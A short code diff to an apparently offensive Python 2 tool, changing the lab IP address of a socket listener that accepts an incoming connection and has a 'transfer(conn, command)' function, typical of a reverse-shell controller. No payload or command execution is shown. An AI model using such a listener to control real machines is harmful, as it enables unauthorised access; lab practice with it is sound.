@@ -100,7 +100,7 @@ def transfer(conn, command):
 def connect():
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind(('192.168.233.128', 8080))
+    s.bind(('192.168.233.134', 8080))
     s.listen(1)
     conn, addr = s.accept()
     print '[+] Connection from ' + str(addr)
